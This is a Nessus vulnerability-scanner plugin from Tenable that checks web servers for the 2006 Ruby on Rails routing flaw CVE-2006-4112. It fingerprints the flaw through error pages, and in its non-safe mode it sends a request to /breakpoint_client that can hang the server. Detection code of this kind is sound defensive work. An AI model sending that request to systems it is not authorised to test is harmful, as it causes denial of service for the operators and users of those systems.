#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server is affected by a code evaluation issue. 

Description :

The remote web server appears to be using a version of Ruby on Rails,
an open-source web framework, that has a flaw in its routing code that
can lead to the the evaluation of Ruby code through the URL. 
Successful exploitation of this issue can result in a denial of
service or even data loss. 

See also :

http://weblog.rubyonrails.com/2006/8/10/rails-1-1-6-backports-and-full-disclosure

Solution :

Either apply the appropriate patch referenced in the vendor advisory
above or upgrade to Ruby on Rails 1.1.6 or later. 

Risk factor :

Medium / CVSS Base Score : 6.9
(AV:R/AC:L/Au:NR/C:P/I:P/A:P/B:N)";


if (description)
{
  script_id(22204);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2006-4112");
  script_bugtraq_id(19454);

  script_name(english:"Ruby on Rails Routing Denial of Service Vulnerability");
  script_summary(english:"Tries to hang Ruby on Rails");

  script_description(english:desc);

  script_category(ACT_MIXED_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 3000);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:3000);
if (!get_port_state(port)) exit(0);


# Make sure it looks like Ruby on Rails.
req = http_get(item:"/rails_info/properties", port:port);
res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
if (res == NULL) exit(0);
if ("only available to local requests." >!< res) exit(0);

if (safe_checks())
{
 # Try a request
 req = http_get(item:"/rails_generator", port:port);
 res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
 if (!res) exit(0);
 if ( ("<title>Action Controller: Exception caught</title>" >< res) &&
      ("Rails::Generator::GeneratorError" >< res) )
 {
  security_warning (port);
  exit (0);
 }

 # Try another one if rails_generator is not used
 req = http_get(item:"/fcgi_handler", port:port);
 res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
 if (!res) exit(0);
 if ( ("<title>Action Controller: Exception caught</title>" >< res) &&
      ("MissingSourceFile" >< res) && ("<pre>no such file to load -- fcgi</pre>" >< res))
 {
  security_warning (port);
  exit (0);
 }
}
else
{
 if (http_is_dead(port:port)) exit(0);

 # Try an exploit.
 req = http_get(item:"/breakpoint_client", port:port);
 res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
 if (res) exit(0);

 # There's a problem if the server is now hung.
 if (http_is_dead(port:port)) security_warning(port);
}
